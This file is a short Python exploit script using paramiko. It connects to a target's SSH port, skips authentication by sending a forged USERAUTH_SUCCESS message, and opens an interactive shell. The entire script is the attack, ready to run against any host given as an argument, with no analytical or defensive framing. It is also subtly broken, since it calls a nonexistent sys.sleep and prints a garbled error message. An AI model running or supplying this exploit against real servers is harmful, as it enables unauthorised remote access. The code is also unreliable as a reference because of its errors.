import paramiko
import socket
import sys

hostname = sys.argv[1]

nbytes=4096
port = 22

sock = socket.socket()

try:
    sock.connect((hostname, port))
    m = paramiko.message.Message()
    transport = paramiko.transport.Transport(sock)
    transport.start_client()

    m.add_byte(paramiko.common.cMSG_USERAUTH_SUCCESS)
    transport._send_message(m)

    cmd_channel = transport.open_session()
    sys.sleep(10)
    cmd_channel.invoke_shell()

except socket.error:
    print("Connection to failed.")
    sys.exit(1)

